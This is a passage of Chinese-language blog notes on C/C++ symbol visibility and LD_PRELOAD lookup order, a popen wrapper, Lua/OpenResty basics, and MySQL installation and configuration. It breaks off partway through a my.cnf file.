<li>可以看到<code>extern &quot;C&quot;</code>使函数导出的符号按照C函数的方式，不加前缀和后缀</li>
</ul>
<h3 id="2-3-隐藏符号"><a href="#2-3-隐藏符号" class="headerlink" title="2.3. 隐藏符号"></a>2.3. 隐藏符号</h3><ul>
<li>二进制的符号可以通过<code>strip</code>命令进行隐藏</li>
<li>默认so库的函数如果没加static都会被编译成外部可调用的形式，readelf可以看到是GLOBAL的形式</li>
<li>但是如果不strip，动态库的符号可能会影响到其他动态库的引入。比如两个动态库内部都定义了一个<code>log_init()</code>函数，并且它们一个是内部使用的函数，不对外暴露，一个是给二进制用的函数。但是因为二进制运行加载顺序导致这个符号冲突了，导致和期望结果不一致。</li>
<li>不对外暴露的接口最好隐藏掉符号。</li>
<li>隐藏符号使用gcc编译选项<code>-fvisibility=hidden</code>，编译出来，所有函数默认是LOCAL形式，strip会隐藏掉</li>
<li>但是需要暴露的符号需要在函数前面加上<code>__attribute__((visibility(&quot;default&quot;)))</code><ul>
<li>加在头文件就可以了</li>
</ul>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> WIN32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXPORT_API __declspec(dllexport)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXPORT_API __attribute__((visibility(<span class="string">&quot;default&quot;</span>)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">EXPORT_API <span class="type">int</span> <span class="title">test</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ -c libtest.cpp -o libtest.o -fvisibility=hidden -fPIC -Wall -Werror -std=c++11</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="2-4-符号加载顺序"><a href="#2-4-符号加载顺序" class="headerlink" title="2.4. 符号加载顺序"></a>2.4. 符号加载顺序</h3><h4 id="1-二进制正常加载"><a href="#1-二进制正常加载" class="headerlink" title="(1) 二进制正常加载"></a>(1) 二进制正常加载</h4><ul>
<li>调用的每个so库的符号，都会从前向后查找库中的符号，谁在前调用谁</li>
</ul>
<h4 id="2-so库里面调用函数"><a href="#2-so库里面调用函数" class="headerlink" title="(2) so库里面调用函数"></a>(2) so库里面调用函数</h4><ul>
<li>如果此函数是内部未导出函数，会调用自己</li>
<li>如果此函数是导出函数，会重新从前向后查找，不会直接用自己</li>
</ul>
<p><strong>示例</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// A.so</span></span><br><span class="line"><span class="function">EXPORT_API <span class="type">void</span> <span class="title">func1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A.so func1\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">func2</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">EXPORT_API <span class="type">void</span> <span class="title">func2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A.so func2\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// B.so</span></span><br><span class="line"><span class="function">EXPORT_API <span class="type">void</span> <span class="title">func2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;B.so func2\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">func1</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>如果，<code>main.cpp</code>链接<code>A.so</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; LD_PRELOAD=./B.so ./main</span><br><span class="line">A.so func1</span><br><span class="line">B.so func2</span><br><span class="line">=&gt; ./main</span><br><span class="line">A.so func1</span><br><span class="line">A.so func2</span><br></pre></td></tr></table></figure>

<h1 id="五、glibc接口"><a href="#五、glibc接口" class="headerlink" title="五、glibc接口"></a>五、glibc接口</h1><h2 id="1-popen-执行命令（跨平台）"><a href="#1-popen-执行命令（跨平台）" class="headerlink" title="1. popen 执行命令（跨平台）"></a>1. popen 执行命令（跨平台）</h2><h3 id="1-1-示例"><a href="#1-1-示例" class="headerlink" title="1.1. 示例"></a>1.1. 示例</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 执行命令，返回结果</span></span><br><span class="line"><span class="comment"> * @param[in] cmd 待执行命令</span></span><br><span class="line"><span class="comment"> * @param[out] outStr 执行结果</span></span><br><span class="line"><span class="comment"> * @param[out] ec 错误信息</span></span><br><span class="line"><span class="comment"> * @param[in] exceptCodes 允许的一些错误，默认只允许成功</span></span><br><span class="line"><span class="comment"> * @return 是否成功，错误信息由ec给出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">cmdPopen</span><span class="params">(<span class="type">const</span> std::string &amp;cmd, std::string &amp;outStr, std::error_code &amp;ec,</span></span></span><br><span class="line"><span class="params"><span class="function">                     <span class="type">const</span> std::vector&lt;<span class="type">int</span>&gt; &amp;exceptCodes = &#123;<span class="number">0</span>&#125;)</span> </span>&#123;</span><br><span class="line">    std::string tag = <span class="string">&quot;popen exec &#x27;&quot;</span> + cmd + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, tag));</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> RESULT_BUF_SIZE = <span class="number">4096</span>;</span><br><span class="line">    <span class="comment">// 使用popen调用命令</span></span><br><span class="line">    <span class="keyword">auto</span> fp = <span class="built_in">popen</span>(cmd.<span class="built_in">c_str</span>(), <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        ec.<span class="built_in">assign</span>(errno, std::<span class="built_in">system_category</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// 读取popen的stdout结果</span></span><br><span class="line">        <span class="type">char</span> resultBuf[RESULT_BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">fgets</span>(resultBuf, RESULT_BUF_SIZE, fp) != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            outStr += resultBuf;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 查看是否是读取出现错误</span></span><br><span class="line">        <span class="keyword">auto</span> ret = <span class="built_in">ferror</span>(fp);</span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;&#123;&#125;, fgets error, ec &#123;&#125;, ignore it&quot;</span>, tag,</span><br><span class="line">                      std::<span class="built_in">to_string</span>(std::<span class="built_in">error_code</span>(ret, std::<span class="built_in">system_category</span>()))));</span><br><span class="line">            <span class="built_in">clearerr</span>(fp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过pclose获取是否执行失败</span></span><br><span class="line">    <span class="keyword">auto</span> ret = <span class="built_in">pclose</span>(fp);</span><br><span class="line">    fp = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">auto</span> exitStatus = <span class="built_in">WIFEXITED</span>(ret);  <span class="comment">// 进程是否退出，不是是否成功退出</span></span><br><span class="line">    <span class="keyword">auto</span> err = <span class="built_in">WEXITSTATUS</span>(ret);       <span class="comment">// 进程退出后的返回值，也就是errno</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进程退出失败，仅打印日志</span></span><br><span class="line">    <span class="keyword">if</span> (!exitStatus) &#123;</span><br><span class="line">        <span class="built_in">LOGW</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;&#123;&#125;, pclose failed&quot;</span>), <span class="built_in">REASON</span>(<span class="string">&quot;process is not exit&quot;</span>), <span class="built_in">WILL</span>(<span class="string">&quot;ignore it&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断是不是需要的错误信息</span></span><br><span class="line">    <span class="keyword">if</span> (std::<span class="built_in">find</span>(exceptCodes.<span class="built_in">begin</span>(), exceptCodes.<span class="built_in">end</span>(), err) == exceptCodes.<span class="built_in">end</span>()) &#123;</span><br><span class="line">        ec.<span class="built_in">assign</span>(err, std::<span class="built_in">system_category</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// error被忽略，输出忽略信息给外面</span></span><br><span class="line">    outStr = <span class="string">&quot;ignore errno:&quot;</span> + std::<span class="built_in">to_string</span>(std::<span class="built_in">error_code</span>(err, std::<span class="built_in">system_category</span>()));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="六、编译原理"><a href="#六、编译原理" class="headerlink" title="六、编译原理"></a>六、编译原理</h1><h2 id="1-链接过程的重定位"><a href="#1-链接过程的重定位" class="headerlink" title="1. 链接过程的重定位"></a>1. 链接过程的重定位</h2><h1 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h1><h2 id="1-redefine错误"><a href="#1-redefine错误" class="headerlink" title="1. redefine错误"></a>1. redefine错误</h2><ul>
<li>全局变量在定义必须在c和cpp中，可以在公用头文件以extern声明，不然会被两个同时包含头文件的源文件编译时报重复定义的错误</li>
<li>宏定义在头文件中定义被两个源文件编译不会报重复定义的错误</li>
<li>宏定义同一个名字在两个头文件定义，内容定义相同不报错，不同则报warning，最新的会覆盖掉老的定义</li>
</ul>
<h2 id="2-confiture模式的第三方库修改编译生成的库的名字"><a href="#2-confiture模式的第三方库修改编译生成的库的名字" class="headerlink" title="2. confiture模式的第三方库修改编译生成的库的名字"></a>2. confiture模式的第三方库修改编译生成的库的名字</h2><p>如libxml2、libcurl等第三方库，如果编译想要换个名字需要将</p>
<ul>
<li>当前目录及子目录的所有<code>Makefile.am</code>、<code>Makefile.in</code>里面的<code>libxxx.la</code>修改成新的名字<code>libdiy.la</code></li>
<li>重新执行<code>./configure &amp;&amp; make</code>即可</li>
</ul>
<h2 id="3-int赋值给unsigned-long-long的问题"><a href="#3-int赋值给unsigned-long-long的问题" class="headerlink" title="3. int赋值给unsigned long long的问题"></a>3. int赋值给unsigned long long的问题</h2><ul>
<li>当int为负数时，赋值给<code>unsigned long long</code>时会将64位前32位变成1，由于补码特性</li>
<li>正常取32位，需要使用<code>unsigned int</code>赋值</li>
</ul>
<h2 id="4-头文件定义static的问题"><a href="#4-头文件定义static的问题" class="headerlink" title="4. 头文件定义static的问题"></a>4. 头文件定义static的问题</h2><ul>
<li>如果头文件定义了static变量（包括函数），效果是每个include的源文件都会存在static变量</li>
<li>如果此变量作为进程唯一就会出问题，除非作为源文件唯一，否则需要定义在c文件中</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>lua和openrestry</title>
    <url>/blogs/2023-10-31-lua/</url>
    <content><![CDATA[<p>参考<a href="https://moonbingbing.gitbooks.io/openresty-best-practices/content/">OpenResty 最佳实践</a></p>
<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1 简介"></a>1 简介</h2><p>Lua 从一开始就是作为一门方便嵌入(其它应用程序)并可扩展的轻量级脚本语言来设计的，因此她一直遵从着简单、小巧、可移植、快速的原则，官方实现完全采用 ANSI C 编写，能以 C 程序库的形式嵌入到宿主程序中。LuaJIT 2 和标准 Lua 5.1 解释器采用的是著名的 MIT 许可协议。正由于上述特点，所以 Lua 在游戏开发、机器人控制、分布式应用、图像处理、生物信息学等各种各样的领域中得到了越来越广泛的应用。其中尤以游戏开发为最，许多著名的游戏，比如 Escape from Monkey Island、World of Warcraft、大话西游，都采用了 Lua 来配合引擎完成数据描述、配置管理和逻辑控制等任务。即使像 Redis 这样中性的内存键值数据库也提供了内嵌用户 Lua 脚本的官方支持。</p>
<h2 id="2-特点"><a href="#2-特点" class="headerlink" title="2 特点"></a>2 特点</h2><ol>
<li>变量名没有类型，值才有类型，变量名在运行时可与任何类型的值绑定;</li>
<li>语言只提供唯一一种数据结构，称为表(table)，它混合了数组、哈希，可以用任何类型的值作为 key 和 value。提供了一致且富有表达力的表构造语法，使得 Lua 很适合描述复杂的数据;</li>
<li>函数是一等类型，支持匿名函数和正则尾递归(proper tail recursion);</li>
<li>支持词法定界(lexical scoping)和闭包(closure);</li>
<li>提供 thread 类型和结构化的协程(coroutine)机制，在此基础上可方便实现协作式多任务;</li>
<li>运行期能编译字符串形式的程序文本并载入虚拟机执行;</li>
<li>通过元表(metatable)和元方法(metamethod)提供动态元机制(dynamic meta-mechanism)，从而允许程序运行时根据需要改变或扩充语法设施的内定语义;</li>
<li>能方便地利用表和动态元机制实现基于原型(prototype-based)的面向对象模型;</li>
<li>从 5.1 版开始提供了完善的模块机制，从而更好地支持开发大型的应用程序;</li>
</ol>
<h2 id="3-lua和luaJIT"><a href="#3-lua和luaJIT" class="headerlink" title="3. lua和luaJIT"></a>3. lua和luaJIT</h2><p>lua本身是一门脚本语言，可以直接运行，但是还有人觉得不够快，所以开发了luaJIT（lua Just-in Time compiler），它可以将lua代码编译成机器码，从而提高运行速度。</p>
<h1 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h1><p><a href="http://openresty.org/en/">http://openresty.org/en/</a></p>
<h2 id="1-windows"><a href="#1-windows" class="headerlink" title="1. windows"></a>1. windows</h2><ul>
<li>下载其中的 <a href="https://openresty.org/download/openresty-1.21.4.2-win32.zip">https://openresty.org/download/openresty-1.21.4.2-win32.zip</a> 或者 <a href="https://openresty.org/download/openresty-1.21.4.2-win64.zip">https://openresty.org/download/openresty-1.21.4.2-win64.zip</a></li>
<li>直接解压即可，本身为可以直接执行的二进制文件</li>
</ul>
<h2 id="2-linux"><a href="#2-linux" class="headerlink" title="2. linux"></a>2. linux</h2><h3 id="2-1-archlinux"><a href="#2-1-archlinux" class="headerlink" title="2.1. archlinux"></a>2.1. archlinux</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">一个是lua，一个是luajit</span></span><br><span class="line">sudo pacman -S lua luajit</span><br></pre></td></tr></table></figure>

<h1 id="三、语法"><a href="#三、语法" class="headerlink" title="三、语法"></a>三、语法</h1><h2 id="1-注释"><a href="#1-注释" class="headerlink" title="1. 注释"></a>1. 注释</h2><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 单行注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--[[</span></span><br><span class="line"><span class="comment">多行注释</span></span><br><span class="line"><span class="comment">]]</span></span><br></pre></td></tr></table></figure>

<h2 id="2-数据类型"><a href="#2-数据类型" class="headerlink" title="2. 数据类型"></a>2. 数据类型</h2><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="string">&quot;hello world&quot;</span>)) <span class="comment">--&gt;output:string</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">print</span>))         <span class="comment">--&gt;output:function</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="literal">true</span>))          <span class="comment">--&gt;output:boolean</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="number">360.0</span>))         <span class="comment">--&gt;output:number</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="literal">nil</span>))           <span class="comment">--&gt;output:nil</span></span><br></pre></td></tr></table></figure>

<h3 id="2-1-nil"><a href="#2-1-nil" class="headerlink" title="2.1. nil"></a>2.1. nil</h3><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> a</span><br><span class="line"><span class="built_in">print</span>(a)                    <span class="comment">--&gt;output:nil</span></span><br></pre></td></tr></table></figure>

<h3 id="2-2-boolean"><a href="#2-2-boolean" class="headerlink" title="2.2. boolean"></a>2.2. boolean</h3><ul>
<li>使用if进行判断的时候，nil和false才为假，其他所有值均为真，<font color="red">0和空字符串就是真</font></li>
</ul>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> a = <span class="literal">true</span></span><br><span class="line"><span class="keyword">if</span> a <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;a&quot;</span>)        <span class="comment">--&gt;output:a</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not a&quot;</span>)    <span class="comment">--这个没有执行</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> b = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> b <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;b&quot;</span>)        <span class="comment">--&gt;output:b</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not b&quot;</span>)    <span class="comment">--这个没有执行</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> c = <span class="literal">nil</span></span><br><span class="line"><span class="keyword">if</span> c <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c&quot;</span>)        <span class="comment">--这个没有执行</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not c&quot;</span>)    <span class="comment">--&gt;output:not c</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h3 id="2-3-string"><a href="#2-3-string" class="headerlink" title="2.3. string"></a>2.3. string</h3><ul>
<li>先看示例</li>
</ul>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> s = <span class="built_in">string</span>.<span class="built_in">char</span>(<span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x00</span>)</span><br><span class="line"><span class="keyword">local</span> s2 = <span class="built_in">string</span>.<span class="built_in">char</span>(<span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x00</span>)</span><br><span class="line"><span class="keyword">local</span> n = <span class="built_in">string</span>.<span class="built_in">len</span>(s)</span><br><span class="line"><span class="keyword">local</span> n1 = #s</span><br><span class="line"><span class="built_in">print</span>(s)                            <span class="comment">--&gt;output:01234</span></span><br><span class="line"><span class="built_in">print</span>(n)                            <span class="comment">--&gt;output:8</span></span><br><span class="line"><span class="built_in">print</span>(n1)                           <span class="comment">--&gt;output:8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">string</span>.<span class="built_in">byte</span>(s, <span class="number">1</span>, n))         <span class="comment">--&gt;output:4849505105210</span></span><br><span class="line"><span class="built_in">print</span>(s == <span class="string">&#x27;01234&#x27;</span>)                 <span class="comment">--&gt;output:false</span></span><br><span class="line"><span class="built_in">print</span>(s == s2)                      <span class="comment">--&gt;output:true</span></span><br></pre></td></tr></table></figure>

<ul>
<li>打印时，不可见字符会跳过包括其他语言认为的<code>\0</code></li>
<li><code>string.len</code>统计的是所有长度，不是到<code>\0</code>截止，<code>#</code>也是一样</li>
<li>虽然打印是<code>01234</code>，但是字符串对比时，还是会计算所有字节进行对比</li>
</ul>
<h1 id="四、系统库"><a href="#四、系统库" class="headerlink" title="四、系统库"></a>四、系统库</h1><h2 id="1-string"><a href="#1-string" class="headerlink" title="1. string"></a>1. string</h2><h3 id="1-1-string-byte"><a href="#1-1-string-byte" class="headerlink" title="1.1. string.byte"></a>1.1. string.byte</h3><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span>.<span class="built_in">byte</span>(s [, i [, j ]])</span><br></pre></td></tr></table></figure>

<ul>
<li>返回字符串<code>s</code>中从<code>i</code>到<code>j</code>的字节</li>
<li>如果<code>i</code>和<code>j</code>都没有指定，默认为1</li>
<li>如果<code>j</code>没有指定，默认与<code>i</code>相等</li>
</ul>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">string</span>.<span class="built_in">byte</span>(<span class="string">&quot;abc&quot;</span>, <span class="number">1</span>, <span class="number">3</span>))     <span class="comment">--&gt;output:979899</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">string</span>.<span class="built_in">byte</span>(<span class="string">&quot;abc&quot;</span>, <span class="number">3</span>))        <span class="comment">--&gt;output:99</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">string</span>.<span class="built_in">byte</span>(<span class="string">&quot;abc&quot;</span>))           <span class="comment">--&gt;output:97</span></span><br></pre></td></tr></table></figure>

<h1 id="五、命令"><a href="#五、命令" class="headerlink" title="五、命令"></a>五、命令</h1><h2 id="1-查看lua查找包的路径"><a href="#1-查看lua查找包的路径" class="headerlink" title="1. 查看lua查找包的路径"></a>1. 查看lua查找包的路径</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lua -e &quot;print(package.path)&quot;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql相关</title>
    <url>/blogs/2023-09-22-mysql/</url>
    <content><![CDATA[<h1 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h1><p>下载地址: <a href="https://dev.mysql.com/downloads/">https://dev.mysql.com/downloads/</a></p>
<h2 id="1-windows"><a href="#1-windows" class="headerlink" title="1. windows"></a>1. windows</h2><ul>
<li>下载msi安装包</li>
<li>按照提示安装</li>
</ul>
<h3 id="1-1-mysqld的一些操作"><a href="#1-1-mysqld的一些操作" class="headerlink" title="1.1. mysqld的一些操作"></a>1.1. mysqld的一些操作</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:: 初始化配置，会创建data目录</span><br><span class="line">mysqld --initialize-insecure</span><br><span class="line"></span><br><span class="line">:::::::::: 服务相关 ::::::::::</span><br><span class="line">:: 安装服务</span><br><span class="line">mysqld --install</span><br><span class="line">:: 卸载服务</span><br><span class="line">mysqld --remove mysql</span><br></pre></td></tr></table></figure>

<h3 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h3><h4 id="1-MYSQL报错-Failed-to-find-valid-data-directory"><a href="#1-MYSQL报错-Failed-to-find-valid-data-directory" class="headerlink" title="1) MYSQL报错 Failed to find valid data directory."></a>1) MYSQL报错 Failed to find valid data directory.</h4><ul>
<li>先删除自己建立的data目录</li>
<li>管理员使用cmd</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:: 看服务中mysql注册的是什么服务，可能叫mysql80</span><br><span class="line"><span class="built_in">net</span> stop mysql</span><br><span class="line">mysqld --remove mysql</span><br><span class="line"></span><br><span class="line">:: 重新初始化配置</span><br><span class="line">mysqld --initialize-insecure</span><br><span class="line">:: 安装服务</span><br><span class="line">mysqld --install</span><br><span class="line"></span><br><span class="line">:: 启动服务</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span> mysqld</span><br></pre></td></tr></table></figure>

<h1 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h1><ul>
<li>推荐的一套配置</li>
</ul>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">## my.cnf for 8.0版本</span></span><br><span class="line"><span class="comment">## author: yejr(yejinrong@zhishutang.com, http://imysql.com, QQ: 4700963)</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment">## 叶金荣(yejr)</span></span><br><span class="line"><span class="comment">## 国内知名MySQL专家，MySQL布道师，Oracle MySQL ACE Director，腾讯云TVP成员。</span></span><br><span class="line"><span class="comment">## 微信公众：老叶茶馆(imysql_wx), 博客：https://imysql.com</span></span><br><span class="line"><span class="comment">## QQ群: 125572178</span></span><br><span class="line"><span class="comment">## 注意：个别建议可能需要根据实际情况作调整，请自行判断或联系我，本人不对这些建议结果负相应责任</span></span><br><span class="line"><span class="comment">## 本配置文件主要适用于MySQL 8.0版本</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="section">[client]</span></span><br><span class="line"><span class="attr">port</span>	= <span class="number">3306</span></span><br><span class="line"><span class="attr">socket</span>	= /data/mysql/mysql.sock</span><br><span class="line"></span><br><span class="line"><span class="section">[mysql]</span></span><br><span class="line"><span class="attr">prompt</span> = <span class="string">&quot;\u@mysqldb \R:\m:\s [\d]&gt; &quot;</span></span><br><span class="line">no_auto_rehash</span><br><span class="line"></span><br><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">user</span>	= mysql</span><br><span class="line"><span class="attr">port</span>	= <span class="number">3306</span></span><br><span class="line"><span class="comment">#主从复制或MGR集群中，server_id记得要不同</span></span><br><span class="line"><span class="comment">#另外，实例启动时会生成 auto.cnf，里面的 server_uuid 值也要不同</span></span><br><span class="line"><span class="comment">#server_uuid的值还可以自己手动指定，只要符合uuid的格式标准就可以</span></span><br><span class="line"><span class="attr">server_id</span> = <span class="number">3306</span></span><br><span class="line"><span class="attr">basedir</span>	= /usr/local/mysql</span><br><span class="line"><span class="attr">datadir</span>	= /data/mysql</span><br><span class="line"><span class="attr">socket</span>	= /data/mysql/mysql.sock</span><br><span class="line"><span class="attr">pid_file</span> = mysqldb.pid</span><br><span class="line"><span class="attr">character_set_server</span> = UTF8MB4</span><br><span class="line"><span class="attr">skip_name_resolve</span> = <span class="number">1</span></span><br><span class="line"><span class="comment">#若你的MySQL数据库主要运行在境外，请务必根据实际情况调整本参数</span></span><br><span class="line"><span class="attr">default_time_zone</span> = <span class="string">&quot;+8:00&quot;</span></span><br><span class="line"><span class="comment">#启用admin_port，连接数爆满等紧急情况下给管理员留个后门</span></span><br><span class="line"><span class="attr">admin_address</span> = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line"><span class="attr">admin_port</span> = <span class="number">33062</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#performance setttings</span></span><br><span class="line"><span class="attr">lock_wait_timeout</span> = <span class="number">3600</span></span><br><span class="line"><span class="attr">open_files_limit</span>    = <span class="number">65535</span></span><br><span class="line"><span class="attr">back_log</span> = <span class="number">1024</span></span><br><span class="line"><span class="attr">max_connections</span> = <span class="number">512</span></span><br><span class="line"><span class="attr">max_connect_errors</span> = <span class="number">1000000</span></span><br><span class="line"><span class="attr">table_open_cache</span> = <span class="number">1024</span></span><br><span class="line"><span class="attr">table_definition_cache</span> = <span class="number">1024</span></span><br><span class="line"><span class="attr">thread_stack</span> = <span class="number">512</span>K</span><br><span class="line"><span class="attr">sort_buffer_size</span> = <span class="number">4</span>M</span><br><span class="line"><span class="attr">join_buffer_size</span> = <span class="number">4</span>M</span><br><span class="line"><span class="attr">read_buffer_size</span> = <span class="number">8</span>M</span><br><span class="line"><span class="attr">read_rnd_buffer_size</span> = <span class="number">4</span>M</span><br><span class="line"><span class="attr">bulk_insert_buffer_size</span> = <span class="number">64</span>M</span><br><span class="line"><span class="attr">thread_cache_size</span> = <span class="number">768</span></span><br><span class="line"><span class="attr">interactive_timeout</span> = <span class="number">600</span></span><br><span class="line"><span class="attr">wait_timeout</span> = <span class="number">600</span></span><br><span class="line"><span class="attr">tmp_table_size</span> = <span class="number">32</span>M</span><br><span class="line"><span class="attr">max_heap_table_size</span> = <span class="number">32</span>M</span><br><span class="line"></span><br><span class="line"><span class="comment">#log settings</span></span><br><span class="line"><span class="attr">log_timestamps</span> = SYSTEM</span><br><span class="line"><span class="attr">log_error</span> = /data/mysql/error.log</span><br><span class="line"><span class="attr">log_error_verbosity</span> = <span class="number">3</span></span><br><span class="line"><span class="attr">slow_query_log</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">log_slow_extra</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">slow_query_log_file</span> = /data/mysql/slow.log</span><br><span class="line"><span class="attr">long_query_time</span> = <span class="number">0.1</span></span><br><span class="line"><span class="attr">log_queries_not_using_indexes</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">log_throttle_queries_not_using_indexes</span> = <span class="number">60</span></span><br><span class="line"><span class="attr">min_examined_row_limit</span> = <span class="number">100</span></span><br><span class="line"><span class="attr">log_slow_admin_statements</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">log_slow_slave_statements</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">log_bin</span> 